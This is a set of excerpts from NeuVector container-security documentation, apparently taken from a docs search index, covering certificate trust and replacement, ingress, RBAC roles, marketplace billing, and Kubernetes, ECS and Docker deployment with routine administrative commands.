./config.py import -u admin -w admin -s $_controllerIP_ -p $_controllerPort_ -f $_FILENAME_ # importing the configuration   Sample python files Contains config.py, client.py, and multipart.py.

A possible reason could be that the certificate has not yet been imported into macOS login certificates store. Another possibility is that an existing certificate has not yet been configured to be trusted. This will disallow the user from accepting it and proceeding to the NeuVector login page with the use of Chrome as illustrated with the example shown below:    Corrective steps can be taken to enable Chrome on accepting the self-signed certificate placed on macOS Keychain store. This can be done by configuring the NeuVector’s certificate to be trusted using the Mac’s Keychain Access application. This is with the assumption that the certificate does indeed exists in the macOS Keychain Access store. We will first look at how to export a certificate from an existing NeuVector node from one system, and later can be imported into another system. There are 2 ways to go about exporting the certificate which we will go over below. They are, using the Chrome browser, and using the macOS Keychain Access application.  Certificate export using Chrome​  The screen capture below illustrates how to access the NeuVector certificate using Chrome.    To export the certificate, drag and drop the certificate to a location of choice.    Certificate export using macOS Keychain-Access​  Launch the macOS Keychain Access application by simultaneously entering the keys ⌘ + F using a Mac keyboard, search for Keychain Access, and double click on the application. This launches the Keychain Access application. Select the NeuVector certificate and choose Export “NeuVector” from the dropdown menu. This will allow the export of the certificate to a location of choice.    Launching the macOS Keychain-Access Application​  There are two ways to launch the macOS Keychain Access Application. This can be done by searching from the macOS, which has been described from the steps immediately above, or using the Chrome browser.  Launching Keychain-Access from the Chrome Browser​  Settings &gt; Advanced &gt; Manage certificates    Clicking on the Manage certificates as shown from above launches the Mac’s Keychain Access application as shown below.    Certificate import into the macOS Keychain-Access Store​  Launch the macOS Keychain Access application by simultaneously entering the keys ⌘ + F using a Mac keyboard, search for Keychain Access, and click on the application. Then import the certificate by drag and dropping a NeuVector certificate (example: nvcertificate.cer) into the Certificate right pane of the Keychain Access application. Now that the certificate has been imported, it is not yet trusted. The following is an example showing the default trust settings after a NeuVector’s certificate has been imported into the Keychain Access application.    Notice that none of the parameters have been configured, and it is not trusted by default. It needs to be configured to be trusted to allow the user to access the login page using the Chrome browser.  Enabling trust for the NeuVector Certificate​  The following steps details on how to enable trust for the NeuVector certificate in the Keychain Access store.    Double clicking on the NeuVector certificate from the screen capture above will bring up another popup dialog box that allows the trust permissions to be configured for different parameters. Configure Secure Sockets Layer (SSL) to “Always Trust”.    Close the dialog box and click on ‘Update Settings” after entering the Mac logon user’s password from the following popup dialog box.    This finalizes the trust configurations. Next, clear all Chrome browser’s cache, close all Chrome browsers, and relaunch the Chrome browser. Next visit the NeuVector login page, and upon clicking on the “Advanced” link, the Proceed to … (unsafe) link will be shown. Clicking on the Proceed to … (unsafe) will allow the user to proceed to the username and password login page.    Below shows a screen capture that allows the user to proceed to the NeuVector login page after Proceed to … (Unsafe) link is clicked.

These should be replaced in both the Manager and Controller deployments. Note: To replace the included certificates for Internal communication between the Controller, Enforcer, and Scanner, please see this section.  The NeuVector web console supports 2 different self-signed certificate types, specifically, the PKCS8 (Private-Key Information Syntax Standard) and PKCS1 (RSA Cryptography Standard). The self-signed certificate can be replaced with either of these PKCS types.  The steps to generate the secret that will be consumed by NeuVector’s web console originating from the key and certificate using either of the PKCS methods will be illustrated below.

This is why it can't be changed to 443.  If you are trying to access the console from your corporate network. Here is the way to use the ClusterIP service and ingress HTTPS redirect to achieve that.  First, create a certificate for HTTPS termination. Here is an example,  openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj &quot;/CN=mycloud.domain.com&quot; kubectl create secret tls neuvector-ingress-tls -n neuvector --key=&quot;tls.key&quot; --cert=&quot;tls.crt&quot;   Then, use the following yaml file to expose the 443 port that redirects the HTTPS connection to the manager.  apiVersion: v1 kind: Service metadata: name: neuvector-cluster-webui namespace: neuvector spec: ports: - port: 443 targetPort: 8443 protocol: TCP type: ClusterIP selector: app: neuvector-manager-pod --- apiVersion: extensions/v1beta1 kind: Ingress metadata: name: neuvector-ingress-webui namespace: neuvector annotations: ingress.mycloud.net/ssl-services: ssl-service=neuvector-cluster-webui spec: tls: - hosts: - cloud.neuvector.com secretName: neuvector-ingress-tls rules: - host: cloud.neuvector.com http: paths: - path: backend: serviceName: neuvector-cluster-webui servicePort: 443   You will need to change the annotation for the ingress address from ingress.mycloud.net to your appropriate address.  This example uses the URL cloud.neuvector.com. After the ingress service is created, you can find it's external IP. You then can configure the hosts file to point cloud.neuvector.com to that IP. After that, you should be able to browse to https://cloud.neuvector.com (the url you choose to use).  Using SSL Passthrough Instead of Redirect​  To use TLS/SSL passthrough instead of the redirect example above (supported on some ingress controllers such as nginx), make sure the ingress controller is configured appropriated for passthrough, and the appropriate annotation is added to the ingress.

For example, below is a global reader (view only) role, but for namespace 'demo' the user has admin permissions and for the namespace 'staging' the user has CI/Ops permissions. If a custom role was previously configured that can also be selected.    note If a user has previously logged in through an enterprise integration, their Identify Provider (e.g. OpenID Connect) will be listed. A user can be promoted to a Federated admin if multi-cluster management is in use by selecting the user and editing.  note When a namespace restricted user configures a registry in Assets in NeuVector, only users with access to that namespace can see/scan that registry. Global users will be able to see/manage that registry, but not any users with restricted namespaces / role.  Roles​  Preconfigured roles include Admin, Reader, and CI/Ops. To create a new custom role, select the Roles tab in Settings -&gt; Users &amp; Roles. Name the role and add the appropriate read or write permission to it.    RBAC Permissions​  Admission Control. Manage admission control rules.Audit Events. View Notification -&gt; Risk reports logs.Authentication. Enable directory and SSO (oidc/saml/ldap) configuration.Authorization. Create new users and custom roles.CI Scan. Allows scanning on images through REST API. Useful for configuring a build-phase plug-in scanner user.Compliance.

Manage Policy menus for Policy Mode (Discover, Monitor, Protect), Network Rules, Process Rules, File Access Rules, DLP, Packet capture, Response Rules.Runtime Scan. Trigger and view run-time vulnerability scanning of containers/nodes/platform.Security Event. Access Notifications -&gt; Security Events logs.System Config. Allow configuration of Settings -&gt; Configuration.  Mapping Groups to Roles and Namespaces​  Groups can be mapped to preset or custom roles in NeuVector. In addition, a role can be restricted to one or more namespaces.  In the LDAP/AD, SAML, or OIDC configuration in Settings, the last section of the configuration screen maps Groups to Roles and Namespaces. First select a default role, if any, for mapping.    To map a group to a role and namespace, click Add to create a new mapping. Select a global role or none. If admin or FedAdmin is selected, this gives write access to all namespaces. If a different role is selected, it can be further restricted by selecting the desired namespace(s).    The following example provides some possible mappings. Demo_admin can read/view all namespaces but has admin rights to the demo and demo2 namespaces. System_admin only has admin rights to the kube-system namespace. And fed_admins has the preset fedAdmin role which gives write access to all resources across multiple clusters.    important If the user is in multiple groups, the role will be 'first matched' in the order listed and group's role assigned. Please adjust the order of configuration for proper behavior by dragging and dropping the mappings to the appropriate order in the list.  Multi-Cluster FedAdmin and Admin Roles for Primary and Remote Management​  When a cluster is promoted to be a Primary cluster, the admin becomes a FedAdmin automatically. The FedAdmin can perform operations on the primary such as generate a federation token for connecting a remote cluster as well as creating federated security rules such as network, process, file, and admission control rules.  Multi-cluster management roles are as follows:  On any cluster, a local admin or a Rancher SSO admin can promote the cluster to become a primary.Ldap/SSO/SAML/OIDC users with admin roles are not able to promote a cluster to primary.Only the FedAdmin can generate the token required to join a remote cluster to the primary.Any admin, including ldap/sso/saml/oidc users can join a remote cluster to the primary if they have the token.Only the FedAdmin can create a new user as a FedAdmin (or FedReader) or assign the FedAdmin (or FedReader) role to an existing user (including ldap/sso/saml/oidc users).

As of the July release, only AKS is supported for the billing adapter (see below options for other environments such as Rancher, Kubernetes, OpenShift etc). Each cluster can report its usage (nodes) independently, or an aggregated node count for a multi-cluster deployment can be reported. An aggregated, multi-cluster deployment can take advantage of the volume discount tiers offered by pooling all nodes across clusters into a single usage billing calculation.  note All clusters in PAYG billing (single, primary, remotes) must be running NeuVector version 5.2.2 or later.  Single Cluster Usage Billing​  Each cluster onto which you have deployed the PAYG billing adapter through the marketplace will report usage information for your Azure account.  Multi-cluster Usage Billing​  To be able to aggregate the node counts from multiple clusters in order to take advantage of volume discounts, the clusters must have been configured for Multi-cluster federation as described in the NeuVector docs. NeuVector on the Primary cluster MUST have been deployed through the Azure Marketplace, with the billing adapter installed in the primary cluster, in order to be able to report the primary and all downstream remote cluster node counts. Do not deploy NeuVector through the marketplace on downstream remote clusters. Use standard deployment methods (Helm, Operator, kubectl etc) described in the NeuVector docs on remote clusters.  Enabling PAYG NeuVector Prime Billing for Existing NeuVector Clusters​  There are several options to enable NeuVector Prime billing on existing NeuVector clusters.  Option 1: The existing cluster must be on a supported PAYG platform. Backup the NeuVector configuration of the existing cluster, remove the NeuVector deployment, then deploy NeuVector through the Azure marketplace. After successful deployment, import the backup configuration. Note: It is recommended that the existing cluster be running version NeuVector 5.2.2 or later before the backup and removal. Option 2: Add the existing cluster as a federated remote cluster to a (existing or newly deployed) primary cluster which already has PAYG billing deployed on it. In this case, the existing cluster can be on any platform supported by NeuVector.  Enabling PAYG NeuVector Prime Billing for Rancher, OpenShift, Tanzu, or other NeuVector supported clusters​  Although PAYG billing deployment is supported on a limited set of Azure platforms (only AKS at initial November 2023 release), billing for other supported NeuVector platforms can be accomplished using the multi-cluster federation configuration. As long as the primary cluster has the PAYG billing deployment of NeuVector, downstream clusters can be any supported NeuVector clusters such as Rancher, Kubernetes, OpenShift, or Tanzu. Downstream clusters can even be on-premise, or on other clouds as long as the remote cluster can be federated to the primary (with appropriate network access).  For Rancher managed downstream clusters with SSO to NeuVector, these clusters can be federated to a non-Rancher primary cluster which is deployed through the Azure marketplace in order to benefit from consolidated multi-cluster billing.

See the Usage instructions on the Azure marketplace listing for NeuVector for instructions.  Console Login through Load Balancer​  If the manager service type was set to Load Balancer during install, an external IP (URL) has been assigned for logging into the NeuVector console. Typically, this URL is accessible from the internet, but your organization may have placed additional restrictions on external access to your cluster. To see the load balancer, type:  kubectl get svc -n neuvector neuvector-service-webui   To get the full login url, type:  SERVICE_IP=$(kubectl get svc --namespace neuvector neuvector-service-webui -o jsonpath=&quot;{.status.loadBalancer.ingress[0].ip}&quot;) echo https://$SERVICE_IP:8443   And you will see something like:  https://&lt;$SERVICE_IP&gt;:8443   This is how you can access the NeuVector console from your browser on the default port 8443.

","version":"5.3","tagName":"h3"},{"title":"Supported Configurations​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/deploying/awsmarketplace#supported-configurations","content":" The marketplace PAYG listing supports deployment on supported target environments only. As of the July release, only EKS is supported for the billing adapter (see below options for other environments such as Rancher, Kubernetes, OpenShift etc). Each cluster can report its usage (nodes) independently, or an aggregated node count for a multi-cluster deployment can be reported. An aggregated, multi-cluster deployment can take advantage of the volume discount tiers offered by pooling all nodes across clusters into a single usage billing calculation.  note All clusters in PAYG billing (single, primary, remotes) must be running NeuVector version 5.2.0 or later.  Single Cluster Usage Billing​  Each cluster onto which you have deployed the PAYG billing adapter through the marketplace will report usage information for your AWS account.  Multi-cluster Usage Billing​  To be able to aggregate the node counts from multiple clusters in order to take advantage of volume discounts, the clusters must have been configured for Multi-cluster federation as described in the NeuVector docs. NeuVector on the Primary cluster MUST have been deployed through the AWS Marketplace, with the billing adapter installed in the primary cluster, in order to be able to report the primary and all downstream remote cluster node counts. Do not deploy NeuVector through the marketplace on downstream remote clusters. Use standard deployment methods (Helm, Operator, kubectl etc) described in the NeuVector docs on remote clusters.  Enabling PAYG NeuVector Prime Billing for Existing NeuVector Clusters​  There are several options to enable NeuVector Prime billing on existing NeuVector clusters.  Option 1: The existing cluster must be on a supported PAYG platform. Backup the NeuVector configuration of the existing cluster, remove the NeuVector deployment, then deploy NeuVector through the AWS marketplace. After successful deployment, import the backup configuration. Note: It is recommended that the existing cluster be running version NeuVector 5.2.0 or later before the backup and removal. For Helm based deployments, this is a sample Helm upgrade command (replacing account ID, IAM role name, previous helm version values file etc):  helm upgrade -n neuvector neuvector oci://709825985650.dkr.ecr.us-east-1.amazonaws.com/suse/neuvector-csp-billing-adapter-llc/core --version 2.4.30002023052201 --create-namespace \\ --set awsbilling.accountNumber=$AWS_ACCT_ID,awsbilling.roleName=$IAM_ROLE_NAME \\ --set awsbilling.enabled=true,containerd.enabled=true -f values-x.y.z.yaml   Option 2: Add the existing cluster as a federated remote cluster to a (existing or newly deployed) primary cluster which already has PAYG billing deployed on it. In this case, the existing cluster can be on any platform supported by NeuVector.  Enabling PAYG NeuVector Prime Billing for Rancher, OpenShift, Tanzu, or other NeuVector supported clusters​  Although PAYG billing deployment is supported on a limited set of AWS platforms (only EKS at initial July release), billing for other supported NeuVector platforms can be accomplished using the multi-cluster federation configuration. As long as the primary cluster has the PAYG billing deployment of NeuVector, downstream clusters can be any supported NeuVector clusters such as Rancher, Kubernetes, OpenShift, or Tanzu. Downstream clusters can even be on-premise, or on other clouds as long as the remote cluster can be federated to the primary (with appropriate network access).  For Rancher managed downstream clusters with SSO to NeuVector, these clusters can be federated to a non-Rancher primary cluster which is deployed through the AWS marketplace in order to benefit from consolidated multi-cluster billing.  ","version":"5.3","tagName":"h3"},{"title":"Deploying NeuVector Prime through the AWS Marketplace​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/deploying/awsmarketplace#deploying-neuvector-prime-through-the-aws-marketplace","content":" A special billing interface is required to enable PAYG to your AWS account. This must be deployed, together with NeuVector from the AWS Marketplace listing for NeuVector. To deploy the billing adapter and NeuVector see the Usage instructions for your region in the marketplace listing above.  The helm install command uses defaults in the values.yaml file. Important defaults to check are the manager service type (LoadBalancer) and container run-time (containerd - which is the typical default for EKS clusters). The default admin username is disabled, and users are required to set a username and password through a secret prior to deployment.  Setting the Admin Username and Password​  It is required to set the admin username and password as a Kubernetes secret prior to deployment.  kubectl create secret generic neuvector-init --from-file=userinitcfg.yaml -n neuvector   note The above step is mandatory, otherwise an admin user will not be created upon NeuVector deployment, making the NeuVector deployment unmanageable.

Console Login through Load Balancer​  If the manager service type was set to Load Balancer during install, an external IP (URL) has been assigned for logging into the NeuVector console. Typically, this URL is accessible from the internet, but your organization may have placed additional restrictions on external access to your cluster. To see the load balancer, type:  kubectl get svc -n neuvector neuvector-service-webui   To get the full login url, type:  SERVICE_IP=$(kubectl get svc --namespace neuvector neuvector-service-webui -o jsonpath=&quot;{.status.loadBalancer.ingress[0].hostname}&quot;) echo https://$SERVICE_IP:8443   And you will see something like:  https://a2647ecdxx33498948a70eea84c5-18386345695.us-west-2.elb.amazonaws.com:8443   This is how you can access the NeuVector console from your browser on the default port 8443.  Once logged in, you can begin to navigate and configure NeuVector.  note The NeuVector scanner image is updated daily with a new CVE database on the NeuVector docker hub registry. It is recommended that the image path be changed to allow for automated daily updates by modifying the scanner and updater image paths AFTER successful initial deployment. For example: kubectl set image deploy/neuvector-scanner-pod neuvector-scanner-pod=docker.io/neuvector/scanner:latest kubectl set image cronjob/neuvector-updater-pod neuvector-updater-pod=docker.io/neuvector/updater:latest   ","version":"5.3","tagName":"h3"},{"title":"Obtaining Support​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/deploying/awsmarketplace#obtaining-support","content":" Once PAYG billing is enabled for a cluster or multiple clusters, customers are eligible for support through the SUSE Support Center (SCC) service.

Prepare several Amazon ECS instances which have the Docker engine and ECS agent containers built-in. Pick one node for the management console. Then define Security Group rules that allow inbound TCP port 8443 (NeuVector’s default management console port) for access by your client browser. Define a Security Group that allows TCP and UDP ports on 18300, 18301, 18400, 18401 . This is used by NeuVector enforcers to talk to the Controllers/Allinone. Apply this Security Group to all the ECS instances that will be deploying the NeuVector enforcers and controllers/allinone. Set an attribute on the nodes that you want to deploy NeuVector allinone or controller container. For example, if you want to run NeuVector in a controller HA mode, the recommendation is to pick at least 3 nodes then add the attribute to all of the 3 nodes.  This is how to add attributes to your ECS instances:  Select the instance, then pick “View/Edit Attributes” from the Actions drop down menu.    Then add a new attribute. For example “allinone-node” with value “true”.    Create the Allinone Task Definition. Create a new Task Definition for the Allinone container. You can use the ECS interface to manually create it or paste in the sample JSON file (see below for samples). Refer to section “1. Deploying NeuVector” of these docs for how to configure the Allinone.  Enter the placement constraint. For example, if you used the attribute labeling above, then enter this in the constraint.  attribute:allinone-node=~true     note If you examine the updated JSON file now you’ll see the placement constraint added to it.  Create a new service for the Allinone task. Set the “Placement Templates” to “One Task Per Host” so that only one Allinone/Controller can run on any host. You will also see the constraint will be used “memberOf(attribute:allinone-node=~true) which requires the node to have that attribute.    Now you can deploy the Allinone service. Set the “Number of tasks” to the desired Allinone/Controller number. Now the NeuVector Allinone or Controller containers will start running on the nodes selected. After the Allinone starts running you should be able to connect to the NeuVector console through HTTPS on port 8443. Create the Enforcer Task Definition. This is similar to the Allinone task. Configure manually through the ECS console or use the JSON sample below.  For the Enforcer placement constraint you will require that the Enforcer must NOT be on the same node as the allinone.  attribute:allinone-node!~true     Create a new service for the Enforcer task. Again, set the Task Placement to “One Task Per Host” so only one Enforcer is deployed on each host. Also note the additional constraint should show that it prevents deployment on an allinone node.    Deploy this service with desired number of enforcer nodes in “Number of tasks”. Very shortly all the enforcers will be up and running. From the NeuVector console you will be able to see all nodes being detected with enforcers.

NeuVector’s services can be easily updated or upgraded without interrupting any running services. To do that in Amazon ECS:  If you have multiple controllers or Allinones deployed as a cluster, ignore this step. If there is only a single Allinone/controller in the system, find a new ECS instance and deploy a 2nd Allinone/controller container on it (follow the NeuVector allinone/controller ECS deployment steps). After deployed, in the NeuVector management console, you will see this new controller up and running (under Resources &gt; Controllers). This is required so that all stateful data is replicated between controllers. In ECS Services, reset and delete the old Allinone/controller service. Pull the updated NeuVector images manually or trigger AWS ECS to pull new versions of Allinone/controller containers from Dockerhub or your private registry. Create a new revision of the Allinone/Controller task, update the “CLUSTER_JOIN_ADDR” to the 2nd Allinone/controller’s private node IP address. Create a new service to deploy this new task (follow the same steps to deploy on ECS). After completed, the new version of the Allinone/controller should be up and running. From the NeuVector management console, all the logs and policies should still be there. Optionally, you can bring down the 2nd Allinone/Controller container now since there should be a Allinone/Controller now started on the original node. From ECS Services, shutdown and update the Enforcers. Manually or auto-trigger the pulling of new Enforcer images. Then restart or update the Enforcer on all nodes. From the NeuVector console, you will see all Enforcers are up to date. If you are using the separate Manager container instead of the Allinone (which already has the manager in it), simply shutdown and remove the old manager container. Then pull the new manager version, and deploy it, pointing the CLUSTER_JOIN_ADDR to the IP of the controller.  All NeuVector containers are now updated live. All policies, logs, and configurations are unaffected. The live graph view will be regenerated automatically as soon as there is new live traffic flowing between containers.

To deploy in this environment, you must use Docker Compose or Run to deploy the NeuVector containers. You can use the remote host deployment (docker-compose -H HOST) to make this task easier.  Here are the sample docker compose configuration files. Note that using docker native does not support deploying the enforcer on the same node as the controller, requiring the use of the Allinone container if controller and enforcer functions are desired on a node.  Note: The environment variable NV_PLATFORM_INFO=platform=Docker is used to notify NeuVector that the platform is Docker/Swarm, even though there may be unused Kubernetes containers detected by NeuVector on a Docker EE deployment. Also to be able to see these in Network Activity -&gt; View -&gt; Show System, add the environment variable for the Enforcer NV_SYSTEM_GROUPS.  Deploy Allinone for High Availability​  For HA in production Docker native or EE environments, deploy the Allinone container on the first three production hosts. Each Allinone should point to the IP addresses of all Allinone hosts. For example, three Allinone containers is the minimum for HA, and the CLUSTER_JOIN_ADDR should list the three IP addresses separated by comma's. Additional HA Allinone's can be deployed in odd numbers, e.g. 5, 7. The deploy the Enforcer on the remaining hosts in the cluster, in any.  Deploy Allinone using docker-compose (privileged mode)​  The following is an example of the docker-compose file to deploy the allinone container on the first node. Because the allinone container has an enforcer module inside, application containers on the same node can be secured. Both greenfield and brownfield deployment are supported.  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: allinone privileged: true environment: - CLUSTER_JOIN_ADDR=node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 8443:8443 volumes: - /lib/modules:/lib/modules:ro - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   The most important environment variable is the CLUSTER_JOIN_ADDR. It is the IP address that other enforcers connect to. Normally, it should be set to the IP address of the node where all-in-one container is running.  Port 18300 and 18301 are default ports for cluster communication. They must be identical for all controllers and enforcers in the cluster. Please refer to &quot;Docker-compose Details&quot; section for how to change the default ports.  Note: To expose the REST API in the Allinone, add the port map for 10443, for example - 10443:10443.  Add an enforcer container using docker-compose (privileged mode)​  This is an example of docker-compose file to join an enforcer into the cluster. Both greenfield and brownfield deployment are supported.  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: enforcer privileged: true environment: - CLUSTER_JOIN_ADDR=controller_node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   The most important environment variable is CLUSTER_JOIN_ADDR. For enforcers, replace &lt;controller_node_ip&gt; with the controller's node IP address. Typically, CLUSTER_JOIN_ADDR in the controller/all-in-one's docker-compose file and enforcer's docker-compose file have the same value.  Deploy the NeuVector Scanner Container​  From NeuVector 4.0+, a separate scanner container must be deployed to perform vulnerability scanning. Important: Always use the :latest tag when pulling and running the scanner image to ensure the latest CVE database is deployed.  Sample docker run to deploy the scanner on the same host as the controller  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   And sample docker-compose  Scanner: image: neuvector/scanner:latest container_name: scanner environment: - CLUSTER_JOIN_ADDR=controller_node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro   To deploy the scanner on a different host than the controller, add the environment variable CLUSTER_ADVERTISED_ADDR so the controller can reach the scanner.  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -e CLUSTER_ADVERTISED_ADDR=scanner_host_ip -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   To deploy multiple scanners on the same host as the controller, remove the port mapping and CLUSTER_ADVERTISED_ADDR environment variable.  docker run -itd --name s1 -e CLUSTER_JOIN_ADDR=controller_node_ip neuvector/scanner:latest   Where s1 is scanner 1 (use s2, s3 etc for each additional scanner).  To deploy a stand alone scanner (no controller/allinone), please see the section Parallel and Standalone Scanners.  To update the Scanner in order to get the latest CVE database updates from NeuVector, create a cron job to stop and restart the scanner, pulling the latest. See this section for details.  Deployment Without Using Privileged Mode​  For some platform configurations it is possible to deploy the NeuVector containers without requiring them to run in privileged mode. The configuration must support the ability to add capabilities and set the apparmor profile. Note that Docker DataCenter/UCP and Swarm currently do not support this, but it is still possible to deploy NeuVector manually using Compose or Run.

Placement of where these containers (on which nodes) are deployed must be considered, and appropriate labels, taints or tolerations created to control them.  The enforcer should be deployed on every host/node where application containers to be monitored and protected by NeuVector will be running.  The controller manages the cluster of enforcers, and can be deployed on the same node as an enforcer or on a separate management node. The manager should be deployed on the node where the controller is running, and will provide console access to the controller. Other required NeuVector containers such as the manager, scanner, and updater are described in more detail in the Best Practices guide referenced below.  If you haven’t done so, pull the images from the NeuVector Docker Hub.  The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example:  neuvector/manager:5.3.2neuvector/controller:5.3.2neuvector/enforcer:5.3.2neuvector/scanner:latestneuvector/updater:latest  Please be sure to update the image references in appropriate yaml files.

If you run multiple controllers in an HA configuration, as long as one controller is always up, all data will be synchronized between controllers.  If you wish to save logs such as violations, threats, vulnerabilities and events please enable the SYSLOG server in Settings.  NeuVector supports persistent data for the NeuVector policy and configuration. This configures a real-time backup to mount a volume at /var/neuvector/ from the controller pod. The primary use case is when the persistent volume is mounted, the configuration and policy are stored during run-time to the persistent volume. In the case of total failure of the cluster, the configuration is automatically restored when the new cluster is created. Configuration and policy can also be manually restored or removed from the /var/neuvector/ volume.  important If a persistent volume is not mounted, NeuVector does NOT store the configuration or policy as persistent data. Be sure to backup the Controller configuration and policy before stopping the allinone or controller container. This can be done in Settings -&gt; Configuration. Alternatively, the controller can be deployed in an HA configuration with 3 or 5 controllers running, in which case the policy will persist with other controllers while one is being updated.  Persistent Volume Example​  The PersistentVolume defined in the cluster is required for persistent volume support. The requirement for NeuVector is that the accessModes needs to be ReadWriteMany(RWX). Not all storage types support the RWX access mode. For example, on GKE you may need to create a RWX persistent volume using NFS storage.  Once the PersistentVolume is created, there needs to be created a PersistentVolumeClaim as below for Controller. Currently the persistent volume is used only for the NeuVector configuration backup files in the controller (Policies, Rules, user data, integrations etc) and registry scan results.  apiVersion: v1 kind: PersistentVolumeClaim metadata: name: neuvector-data namespace: neuvector spec: accessModes: - ReadWriteMany volumeMode: Filesystem resources: requests: storage: 1Gi   Here is an example for IBM Cloud:  apiVersion: v1 kind: PersistentVolumeClaim metadata: name: neuvector-data namespace: neuvector labels: billingType: &quot;hourly&quot; region: us-south zone: sjc03 spec: accessModes: - ReadWriteMany resources: requests: storage: 5Gi iops: &quot;100&quot; storageClassName: ibmc-file-retain-custom   After the Persistent Volume Claim is created, modify the NeuVector sample yaml file as shown below (old section commented out):  ... spec: template: spec: volumes: - name: nv-share # hostPath: // replaced by persistentVolumeClaim # path: /var/neuvector // replaced by persistentVolumeClaim persistentVolumeClaim: claimName: neuvector-data   Also add the following environment variable in the Controller or Allinone sample yamls for persistent volume support. This will make the Controller read the backup config when starting.   - name: CTRL_PERSIST_CONFIG   ConfigMaps and Persistent Storage​  Both the ConfigMaps and the persistent storage backup are only read when a new NeuVector cluster is deployed, or the cluster fails and is restarted. They are not used during rolling upgrades.  The persistent storage configuration backup is read first, then the ConfigMaps are applied, so ConfigMap settings take precedence. All ConfigMap settings (e.g. updates) will also be saved into persistent storage.  For more information see the ConfigMaps section.

For replacing certificates used by external access to NeuVector (i.e, browser to the Manager, or REST API to the Controller), please see this section. See below for replacing the certificates used in internal communication between NeuVector containers.  warning Replacing certificates is recommended to be performed only during initial deployment of NeuVector. Replacing on a running cluster (even with rolling upgrade) may result in an unstable state where NeuVector pods are unable to communicate with each other due to a mismatch in certificates, and DATA LOSS may occur.  Replacing Certificates Used in Internal Communications of NeuVector​  Replace the internal encryption files ca.crt, tls.key, tls.crt as follows:  Create a new ca.cfg file with your favorite editor:  [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = California L = San Jose O = NeuVector Inc.

Choose your scenario from the three options below:  New certificateUpdate current certificate with SANsRegenarate certificate files and add SANs If your certificate is about to expire and you need to generate a new one, follow the steps below: Delete the old ca.crt, tls.key, tls.crt, kubernetes secret, and generate new ones: kubectl delete secret internal-cert -n neuvector openssl genrsa -out ca.key 2048 openssl req -x509 -sha256 -new -nodes -key ca.key -days 3650 -out ca.crt openssl genrsa -out tls.key 2048 openssl req -new -key tls.key -sha256 -out cert.csr -config ca.cfg openssl req -in cert.csr -noout -text openssl x509 -req -sha256 -in cert.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out tls.crt -days 3650 -extensions 'v3_req' -extfile ca.cfg openssl x509 -in tls.crt -text kubectl create secret generic internal-cert -n neuvector --from-file=tls.key --from-file=tls.crt --from-file=ca.crt Then edit the Controller, Enforcer, and Scanner deployment yamls, adding: containers: - name: neuvector-controller/enforcer/scanner-pod volumeMounts: - mountPath: /etc/neuvector/certs/internal/tls.key name: internal-cert readOnly: true subPath: tls.key - mountPath: /etc/neuvector/certs/internal/tls.crt name: internal-cert readOnly: true subPath: tls.crt - mountPath: /etc/neuvector/certs/internal/ca.crt name: internal-cert readOnly: true subPath: ca.crt volumes: - name: internal-cert secret: defaultMode: 420 secretName: internal-cert Then proceed to deploy NeuVector as before. You can also shell into the controller/enforcer/scanner pods to confirm that the ca.crt, tls.key, tls.crt files are the customized ones and that the NeuVector communications are working using the new certificates.

NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm. The NeuVector Operator can also be used to deploy and is based on the Helm chart. To deploy the latest NeuVector container versions using an Operator, please use either the Red Hat Certified Operator from Operator Hub or the community operator, as detailed in the Operator section.  To deploy manually, first pull the appropriate NeuVector containers from the NeuVector registry into your local registry. Note: the scanner image should be pulled regularly for CVE database updates from NeuVector.  NeuVector Images on Docker Hub​  The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater.

You can use this feature to update the NeuVector containers. The most important will be to ensure that there is at least one Allinone/Controller running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 30 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  Before starting the rolling updates, please pull and tag the NeuVector containers the same way as in the beginning of this page. You can pull the latest without a version number, but to trigger the rolling update you’ll need to tag the image with a version.  For example, for the controller (latest):  docker pull neuvector/controller   Then to tag/push, if latest version is 2.0.1, same as step 3 at the top of this page:  docker login -u &lt;user_name&gt; -p `oc whoami -t` docker-registry.default.svc:5000 docker tag neuvector/controller docker-registry.default.svc:5000/neuvector/controller:2.0.1 docker push docker-registry.default.svc:5000/neuvector/controller:2.0.1   You can now update your yaml file with these new versions and ‘apply’, or use the ‘oc set image ...’ command to trigger the rolling update. Please see the Kubernetes rolling update samples in this Production section to how to launch and monitor rolling updates of the NeuVector containers.  The provided sample deployment yamls already configure the rolling update policy.

First, create your K8s cluster and confirm access with kubectl get nodes.  To deploy NeuVector use the sample deployment instructions and examples from the Kubernetes section of the Production Deployment. Edit the sample yaml if you are pulling NeuVector images from a local or cloud registry such as ECR or ACR.  Some cloud providers have integrated load balancers which are easy to deploy by using Type: LoadBalancer instead of NodePort for the NeuVector webui.  NeuVector also supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  Network Access​  Make sure internal and external ingress access is configured properly. For the NodePort service, the random port in the 3xxxx range must be accessible on a public IP of a worker or master node from the outside.

